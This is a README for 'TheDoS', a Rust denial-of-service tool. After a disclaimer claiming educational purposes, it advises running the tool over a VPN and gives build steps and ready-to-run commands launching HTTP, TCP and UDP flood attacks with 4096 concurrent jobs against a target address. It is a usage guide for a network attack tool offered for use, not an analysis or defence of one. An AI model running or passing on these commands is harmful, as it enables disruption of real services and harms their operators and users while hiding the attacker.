

<p align="center">
    <img src="https://github.com/wildonion/thedos/blob/master/onion.png"
</p>


## 🚨 Disclaimer

I AM **NOT** RESPONSIBLE FOR WHAT YOU WANT TO DO WITH THIS TOOL, THIS IS FOR EDUCATIONAL PURPOSES.

## ☠ TheDoS (The Developer of Sin)

Attack networks asynchronously by getting help of workers! 

<p align="center">
    <img src="https://github.com/wildonion/thedos/blob/master/log_nginx.png"
</p>

## 🚬 Usage

> run it over VPN

> default jobs are 4096

> build using: ```cargo build --release```

* start http attack with 4096 jobs: ```./thedos --http-addr http://example.app --jobs 4096```

* start tcp attack with 4096 jobs: ```./thedos --tcp-addr 93.184.216.34:24535 --jobs 4096```

* start udp attack with 4096 jobs: ```./thedos --udp-addr 93.184.216.34:24535 --jobs 4096```

OR

* start http attack with 4096 jobs: ```cargo run -- --http-addr http://example.app --jobs 4096```

* start tcp attack with 4096 jobs: ```cargo run -- --tcp-addr 93.184.216.34:24535 --jobs 4096```

* start udp attack with 4096 jobs: ```cargo run -- --udp-addr 93.184.216.34:24535 --jobs 4096```
